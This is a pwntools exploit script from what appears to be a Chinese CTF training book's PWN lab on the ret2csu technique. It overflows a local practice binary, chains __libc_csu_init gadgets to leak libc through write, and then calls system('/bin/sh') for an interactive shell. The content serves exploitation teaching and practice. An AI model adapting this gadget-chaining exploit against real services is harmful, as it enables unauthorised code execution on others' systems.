# 从0到1：CTFer成长之路-PWN篇_实验8： 8.ret2csu
from pwn import *

s = process("./CSU")
elf = ELF("./CSU")
context(log_level='debug', arch='amd64', os='linux')


def get_csu_address():
    csu_init_address = elf.symbols['__libc_csu_init']
    csu_init_disasm = elf.disasm(csu_init_address, 150)
    instructions = csu_init_disasm.split('ret', 1)[0] + 'ret'
    # print(instructions)

    instructions_rdx = instructions.rsplit('rdx,', 1)
    csu_exec = instructions_rdx[0].splitlines()[-1].split(':')[0].strip()
    csu_start = instructions.splitlines()[-8].split(':')[0].strip()

    csu_exec_int = int(csu_exec, 16)
    csu_start_int = int(csu_start, 16)
    return csu_exec_int, csu_start_int


def csu(rdi, rsi, rdx, func):
    payload = flat('A' * 8, 0, 1, func, rdi, rsi, rdx)
    return payload


csu_exec, csu_start = get_csu_address()
# csu_start = 0x400606
# csu_exec2 = 0x4005F0

# gdb.attach(s, "b *0x400563\nc")
payload = flat('A' * 0x60, 0, csu_start, csu(1, elf.got['write'], 8, elf.got['write']), csu_exec)  # 直接填好下一次ret2rsu的寄存器，让payload变得短一点
payload += csu(0, elf.bss(0x500), 0x100, elf.got['read']) + p64(csu_exec)  # 就是说前面的  csu(0, elf.bss(0x500), 0x100, elf.got['read']) 是下一个 csu_exec的参数
payload += csu(elf.bss(0x500) + 8, 0, 0, elf.bss(0x500)) + p64(csu_exec)
s.send(payload)

libc = ELF("./libc-2.23.so")
libc.address = u64(s.recvuntil("\x7f")[-6:] + b"\x00\x00") - libc.sym['write']
success(hex(libc.address))

# raw_input(">")
payload = p64(libc.sym['system']) + b"/bin/sh\x00"
s.send(payload)

s.interactive()
